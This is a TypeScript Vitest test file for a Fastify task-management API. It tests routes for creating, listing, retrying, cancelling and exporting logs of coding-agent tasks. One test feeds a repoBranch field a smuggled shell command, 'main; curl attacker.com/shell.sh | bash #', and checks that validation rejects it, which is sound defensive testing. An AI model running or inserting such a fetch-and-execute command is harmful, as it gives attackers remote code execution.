import { describe, it, expect, vi, beforeEach } from "vitest";
import type { FastifyInstance } from "fastify";
import { buildRouteTestApp } from "../test-utils/build-route-test-app.js";

// ─── Mocks ───

const mockListTasks = vi.fn();
const mockSearchTasks = vi.fn();
const mockGetTask = vi.fn();
const mockCreateTask = vi.fn();
const mockTransitionTask = vi.fn();
const mockForceRedoTask = vi.fn();
const mockGetTaskLogs = vi.fn();
const mockGetAllTaskLogs = vi.fn();
const mockGetTaskEvents = vi.fn();
const mockGetTaskStats = vi.fn();

vi.mock("../services/task-service.js", () => ({
  listTasks: (...args: unknown[]) => mockListTasks(...args),
  searchTasks: (...args: unknown[]) => mockSearchTasks(...args),
  getTask: (...args: unknown[]) => mockGetTask(...args),
  createTask: (...args: unknown[]) => mockCreateTask(...args),
  transitionTask: (...args: unknown[]) => mockTransitionTask(...args),
  forceRedoTask: (...args: unknown[]) => mockForceRedoTask(...args),
  getTaskLogs: (...args: unknown[]) => mockGetTaskLogs(...args),
  getAllTaskLogs: (...args: unknown[]) => mockGetAllTaskLogs(...args),
  getTaskEvents: (...args: unknown[]) => mockGetTaskEvents(...args),
  getTaskStats: (...args: unknown[]) => mockGetTaskStats(...args),
  hydratePrReviewPrUrls: async (rows: unknown[]) => rows,
}));

const mockAddDependencies = vi.fn();
vi.mock("../services/dependency-service.js", () => ({
  addDependencies: (...args: unknown[]) => mockAddDependencies(...args),
  computePendingReason: vi.fn().mockResolvedValue(null),
}));

const mockSubtaskGetPipelineProgress = vi.fn().mockResolvedValue(null);
vi.mock("../services/subtask-service.js", () => ({
  getPipelineProgress: (...args: unknown[]) => mockSubtaskGetPipelineProgress(...args),
}));

const mockQueueAdd = vi.fn().mockResolvedValue(undefined);
const mockQueueGetJobs = vi.fn().mockResolvedValue([]);

vi.mock("../workers/task-worker.js", () => ({
  taskQueue: {
    add: (...args: unknown[]) => mockQueueAdd(...args),
    getJobs: (...args: unknown[]) => mockQueueGetJobs(...args),
  },
}));

const mockDbUpdate = vi.fn();
vi.mock("../db/client.js", () => ({
  db: {
    update: () => ({
      set: () => ({
        where: (...args: unknown[]) => mockDbUpdate(...args),
      }),
    }),
  },
}));

vi.mock("../db/schema.js", () => ({
  tasks: { id: "id" },
}));

vi.mock("../services/review-service.js", () => ({
  launchReview: vi.fn().mockResolvedValue("review-task-1"),
}));

// The unified resolver falls through to task_configs and workflows when the
// tasks table lookup returns null. Stub to null so existing repo-task tests
// continue to see 404s.
const mockResolveAnyTaskById = vi.fn().mockResolvedValue(null);
vi.mock("../services/unified-task-service.js", () => ({
  resolveAnyTaskById: (...args: unknown[]) => mockResolveAnyTaskById(...args),
  listUnifiedTasks: vi.fn().mockResolvedValue([]),
  listUnifiedRuns: vi.fn().mockResolvedValue([]),
  getUnifiedRun: vi.fn().mockResolvedValue(null),
  listTriggersForParent: vi.fn().mockResolvedValue([]),
  getTriggerForParent: vi.fn().mockResolvedValue(null),
}));

// POST /api/tasks now dispatches to workflow-service and task-config-service
// when the body's `type` is "standalone" or "repo-blueprint". Stub both so
// the default "repo-task" path keeps working.
vi.mock("../services/workflow-service.js", () => ({
  createWorkflow: vi.fn(),
  getWorkflow: vi.fn(),
  listWorkflows: vi.fn().mockResolvedValue([]),
  createWorkflowTrigger: vi.fn(),
  updateWorkflowTrigger: vi.fn(),
  deleteWorkflowTrigger: vi.fn(),
  createWorkflowRun: vi.fn(),
}));

vi.mock("../services/task-config-service.js", () => ({
  createTaskConfig: vi.fn(),
  getTaskConfig: vi.fn(),
  listTaskConfigs: vi.fn().mockResolvedValue([]),
  instantiateTask: vi.fn(),
  createTaskConfigTrigger: vi.fn(),
  updateTaskConfigTrigger: vi.fn(),
  deleteTaskConfigTrigger: vi.fn(),
}));

import { taskRoutes } from "./tasks.js";

// ─── Helpers ───

async function buildTestApp(): Promise<FastifyInstance> {
  return buildRouteTestApp(taskRoutes);
}

// Complete task mock matching the post-migration TaskSchema. Any missing
// field here risks failing the response serializer on routes that declare
// `schema.response[200]: TaskSchema`. Keep in sync with
// `apps/api/src/schemas/task.ts`.
const mockTaskData = {
  id: "task-1",
  title: "Fix bug",
  prompt: "Fix the bug",
  repoUrl: "https://github.com/org/repo",
  repoBranch: "main",
  state: "running",
  agentType: "claude-code",
  containerId: null,
  sessionId: "sess-1",
  prUrl: null,
  prNumber: null,
  prState: null,
  prChecksStatus: null,
  prReviewStatus: null,
  prReviewComments: null,
  resultSummary: null,
  costUsd: null,
  inputTokens: null,
  outputTokens: null,
  modelUsed: null,
  errorMessage: null,
  ticketSource: null,
  ticketExternalId: null,
  metadata: null,
  retryCount: 0,
  maxRetries: 1,
  priority: 100,
  parentTaskId: null,
  taskType: "coding",
  subtaskOrder: 0,
  blocksParent: false,
  worktreeState: null,
  lastPodId: null,
  workflowRunId: null,
  createdBy: null,
  ignoreOffPeak: false,
  lastActivityAt: null,
  activitySubstate: "active",
  workspaceId: "ws-1",
  lastMessageAt: null,
  createdAt: new Date("2026-04-11T12:00:00Z"),
  updatedAt: new Date("2026-04-11T12:00:00Z"),
  startedAt: null,
  completedAt: null,
};

describe("GET /api/tasks", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("lists tasks with default pagination", async () => {
    mockListTasks.mockResolvedValue([mockTaskData]);

    const res = await app.inject({ method: "GET", url: "/api/tasks" });

    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.tasks).toHaveLength(1);
    expect(body.limit).toBe(50);
    expect(body.offset).toBe(0);
    expect(mockListTasks).toHaveBeenCalledWith({
      state: undefined,
      limit: 50,
      offset: 0,
      workspaceId: "ws-1",
    });
  });

  it("passes state filter and pagination", async () => {
    mockListTasks.mockResolvedValue([]);

    const res = await app.inject({
      method: "GET",
      url: "/api/tasks?state=running&limit=10&offset=20",
    });

    expect(res.statusCode).toBe(200);
    expect(mockListTasks).toHaveBeenCalledWith({
      state: "running",
      limit: 10,
      offset: 20,
      workspaceId: "ws-1",
    });
  });
});

describe("GET /api/tasks/search", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("performs search with query params", async () => {
    mockSearchTasks.mockResolvedValue({ tasks: [], nextCursor: null, total: 0 });

    const res = await app.inject({
      method: "GET",
      url: "/api/tasks/search?q=bug&state=failed",
    });

    expect(res.statusCode).toBe(200);
    expect(mockSearchTasks).toHaveBeenCalledWith(
      expect.objectContaining({ q: "bug", state: "failed", workspaceId: "ws-1" }),
    );
  });
});

describe("GET /api/tasks/:id", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("returns a task", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);

    const res = await app.inject({ method: "GET", url: "/api/tasks/task-1" });

    expect(res.statusCode).toBe(200);
    expect(res.json().task.id).toBe("task-1");
  });

  it("returns 404 for nonexistent task", async () => {
    mockGetTask.mockResolvedValue(null);

    const res = await app.inject({ method: "GET", url: "/api/tasks/nonexistent" });

    expect(res.statusCode).toBe(404);
    expect(res.json().error).toBe("Task not found");
  });

  it("returns 404 for task in different workspace", async () => {
    mockGetTask.mockResolvedValue({ ...mockTaskData, workspaceId: "ws-other" });

    const res = await app.inject({ method: "GET", url: "/api/tasks/task-1" });

    expect(res.statusCode).toBe(404);
  });
});

describe("POST /api/tasks", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("creates a task and enqueues it", async () => {
    mockCreateTask.mockResolvedValue({ ...mockTaskData, id: "new-task" });
    mockTransitionTask.mockResolvedValue(undefined);

    const res = await app.inject({
      method: "POST",
      url: "/api/tasks",
      payload: {
        title: "Fix bug",
        prompt: "Fix the bug",
        repoUrl: "https://github.com/org/repo",
        agentType: "claude-code",
      },
    });

    expect(res.statusCode).toBe(201);
    expect(mockCreateTask).toHaveBeenCalledWith(
      expect.objectContaining({
        title: "Fix bug",
        prompt: "Fix the bug",
        repoUrl: "https://github.com/org/repo",
        agentType: "claude-code",
        workspaceId: "ws-1",
      }),
    );
    expect(mockTransitionTask).toHaveBeenCalled();
    expect(mockQueueAdd).toHaveBeenCalled();
  });

  it("creates a task with dependencies", async () => {
    mockCreateTask.mockResolvedValue({ ...mockTaskData, id: "new-task" });
    mockTransitionTask.mockResolvedValue(undefined);
    mockAddDependencies.mockResolvedValue(undefined);

    const res = await app.inject({
      method: "POST",
      url: "/api/tasks",
      payload: {
        title: "Fix bug",
        prompt: "Fix the bug",
        repoUrl: "https://github.com/org/repo",
        agentType: "claude-code",
        dependsOn: ["00000000-0000-0000-0000-000000000001"],
      },
    });

    expect(res.statusCode).toBe(201);
    expect(mockAddDependencies).toHaveBeenCalledWith("new-task", [
      "00000000-0000-0000-0000-000000000001",
    ]);
    // Should transition to WAITING_ON_DEPS instead of QUEUED
    expect(mockTransitionTask).toHaveBeenCalledWith(
      "new-task",
      "waiting_on_deps",
      "task_submitted_with_deps",
      undefined,
      "user-1",
    );
    // Should NOT enqueue when dependencies exist
    expect(mockQueueAdd).not.toHaveBeenCalled();
  });

  it("rejects invalid agentType (400 from Zod body schema)", async () => {
    const res = await app.inject({
      method: "POST",
      url: "/api/tasks",
      payload: {
        title: "Fix bug",
        prompt: "Fix the bug",
        repoUrl: "https://github.com/org/repo",
        agentType: "invalid-agent",
      },
    });

    expect(res.statusCode).toBe(400);
    expect(res.json().error).toBe("Validation error");
  });

  it("rejects missing required fields (400 from Zod body schema)", async () => {
    const res = await app.inject({
      method: "POST",
      url: "/api/tasks",
      payload: { title: "Fix bug" },
    });

    expect(res.statusCode).toBe(400);
    expect(res.json().error).toBe("Validation error");
  });

  it("rejects repoBranch with shell injection characters", async () => {
    const res = await app.inject({
      method: "POST",
      url: "/api/tasks",
      payload: {
        title: "Fix bug",
        prompt: "Fix the bug",
        repoUrl: "https://github.com/org/repo",
        repoBranch: "main; curl attacker.com/shell.sh | bash #",
      },
    });

    expect(res.statusCode).toBe(400);
    expect(res.json().error).toBe("Validation error");
  });

  it("accepts valid repoBranch names", async () => {
    mockCreateTask.mockResolvedValue({ ...mockTaskData, id: "new-task" });
    mockTransitionTask.mockResolvedValue(undefined);

    const res = await app.inject({
      method: "POST",
      url: "/api/tasks",
      payload: {
        title: "Fix bug",
        prompt: "Fix the bug",
        repoUrl: "https://github.com/org/repo",
        repoBranch: "feature/my-branch.v2",
        agentType: "claude-code",
      },
    });

    expect(res.statusCode).toBe(201);
  });
});

describe("POST /api/tasks/:id/cancel", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("cancels a task", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);
    mockTransitionTask.mockResolvedValue({ ...mockTaskData, state: "cancelled" });

    const res = await app.inject({ method: "POST", url: "/api/tasks/task-1/cancel" });

    expect(res.statusCode).toBe(200);
    expect(mockTransitionTask).toHaveBeenCalledWith(
      "task-1",
      "cancelled",
      "user_cancel",
      undefined,
      "user-1",
    );
  });

  it("returns 404 for nonexistent task", async () => {
    mockGetTask.mockResolvedValue(null);

    const res = await app.inject({ method: "POST", url: "/api/tasks/nonexistent/cancel" });

    expect(res.statusCode).toBe(404);
  });
});

describe("POST /api/tasks/:id/retry", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("retries a task and enqueues it", async () => {
    mockGetTask.mockResolvedValue({ ...mockTaskData, state: "failed" });
    mockTransitionTask.mockResolvedValue({ ...mockTaskData, state: "queued" });

    const res = await app.inject({ method: "POST", url: "/api/tasks/task-1/retry" });

    expect(res.statusCode).toBe(200);
    expect(mockTransitionTask).toHaveBeenCalledWith(
      "task-1",
      "queued",
      "user_retry",
      undefined,
      "user-1",
    );
    expect(mockQueueAdd).toHaveBeenCalled();
  });

  it("includes restartFromBranch when task has a PR", async () => {
    mockGetTask.mockResolvedValue({
      ...mockTaskData,
      state: "failed",
      prUrl: "https://github.com/org/repo/pull/1",
    });
    mockTransitionTask.mockResolvedValue({ ...mockTaskData, state: "queued" });

    const res = await app.inject({ method: "POST", url: "/api/tasks/task-1/retry" });

    expect(res.statusCode).toBe(200);
    expect(mockQueueAdd).toHaveBeenCalledWith(
      "process-task",
      expect.objectContaining({ taskId: "task-1", restartFromBranch: true }),
      expect.any(Object),
    );
  });
});

describe("POST /api/tasks/:id/force-redo", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("force-redoes a task", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);
    mockForceRedoTask.mockResolvedValue({ ...mockTaskData, state: "queued" });

    const res = await app.inject({ method: "POST", url: "/api/tasks/task-1/force-redo" });

    expect(res.statusCode).toBe(200);
    expect(mockForceRedoTask).toHaveBeenCalledWith("task-1");
    expect(mockQueueAdd).toHaveBeenCalled();
  });
});

describe("GET /api/tasks/:id/logs", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("returns task logs with default pagination", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);
    mockGetTaskLogs.mockResolvedValue([
      {
        id: "log-1",
        taskId: "task-1",
        stream: "stdout",
        content: "hello",
        logType: "text",
        metadata: null,
        workflowRunId: null,
        timestamp: new Date("2026-04-11T12:00:00Z"),
      },
    ]);

    const res = await app.inject({ method: "GET", url: "/api/tasks/task-1/logs" });

    expect(res.statusCode).toBe(200);
    expect(res.json().logs).toHaveLength(1);
    expect(mockGetTaskLogs).toHaveBeenCalledWith("task-1", {
      limit: 200,
      offset: 0,
      search: undefined,
      logType: undefined,
    });
  });
});

describe("GET /api/tasks/:id/logs/export", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("exports logs as JSON by default", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);
    mockGetAllTaskLogs.mockResolvedValue([]);

    const res = await app.inject({ method: "GET", url: "/api/tasks/task-1/logs/export" });

    expect(res.statusCode).toBe(200);
    expect(res.headers["content-type"]).toContain("application/json");
  });

  it("exports logs as plaintext", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);
    mockGetAllTaskLogs.mockResolvedValue([
      { timestamp: "2026-03-27T10:00:00Z", logType: "text", content: "hello" },
    ]);

    const res = await app.inject({
      method: "GET",
      url: "/api/tasks/task-1/logs/export?format=plaintext",
    });

    expect(res.statusCode).toBe(200);
    expect(res.headers["content-type"]).toContain("text/plain");
    expect(res.body).toContain("hello");
  });

  it("exports logs as markdown", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);
    mockGetAllTaskLogs.mockResolvedValue([
      { timestamp: "2026-03-27T10:00:00Z", logType: "text", content: "hello" },
    ]);

    const res = await app.inject({
      method: "GET",
      url: "/api/tasks/task-1/logs/export?format=markdown",
    });

    expect(res.statusCode).toBe(200);
    expect(res.headers["content-type"]).toContain("text/markdown");
    expect(res.body).toContain("# Task Logs:");
  });
});

describe("GET /api/tasks/:id/events", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("returns task events", async () => {
    mockGetTask.mockResolvedValue(mockTaskData);
    mockGetTaskEvents.mockResolvedValue([
      {
        id: "ev-1",
        taskId: "task-1",
        fromState: "pending",
        toState: "queued",
        trigger: "task_submitted",
        message: null,
        userId: "user-1",
        createdAt: new Date("2026-04-11T12:00:00Z"),
      },
    ]);

    const res = await app.inject({ method: "GET", url: "/api/tasks/task-1/events" });

    expect(res.statusCode).toBe(200);
    expect(res.json().events).toHaveLength(1);
  });
});

describe("POST /api/tasks/reorder", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    mockDbUpdate.mockResolvedValue(undefined);
    app = await buildTestApp();
  });

  it("reorders tasks by priority", async () => {
    const res = await app.inject({
      method: "POST",
      url: "/api/tasks/reorder",
      payload: { taskIds: ["task-a", "task-b", "task-c"] },
    });

    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual({ ok: true, reordered: 3 });
  });

  it("rejects non-array taskIds", async () => {
    const res = await app.inject({
      method: "POST",
      url: "/api/tasks/reorder",
      payload: { taskIds: "not-an-array" },
    });

    expect(res.statusCode).toBe(400);
    expect(res.json().error).toBe("Validation error");
  });
});

describe("GET /api/tasks/stats", () => {
  let app: FastifyInstance;

  beforeEach(async () => {
    vi.clearAllMocks();
    app = await buildTestApp();
  });

  it("returns aggregated task stats", async () => {
    mockGetTaskStats.mockResolvedValue({
      total: 42,
      queued: 3,
      running: 2,
      ci: 1,
      review: 1,
      needsAttention: 1,
      failed: 5,
      completed: 30,
    });

    const res = await app.inject({ method: "GET", url: "/api/tasks/stats" });

    expect(res.statusCode).toBe(200);
    const body = res.json();
    expect(body.stats.total).toBe(42);
    expect(body.stats.queued).toBe(3);
    expect(body.stats.running).toBe(2);
    expect(body.stats.ci).toBe(1);
    expect(body.stats.review).toBe(1);
    expect(body.stats.needsAttention).toBe(1);
    expect(body.stats.failed).toBe(5);
    expect(body.stats.completed).toBe(30);
    expect(mockGetTaskStats).toHaveBeenCalledWith("ws-1");
  });

  it("passes workspace ID from the authenticated user", async () => {
    mockGetTaskStats.mockResolvedValue({
      total: 0,
      queued: 0,
      running: 0,
      ci: 0,
      review: 0,
      needsAttention: 0,
      failed: 0,
      completed: 0,
    });

    const res = await app.inject({ method: "GET", url: "/api/tasks/stats" });

    expect(res.statusCode).toBe(200);
    expect(mockGetTaskStats).toHaveBeenCalledWith("ws-1");
  });
});
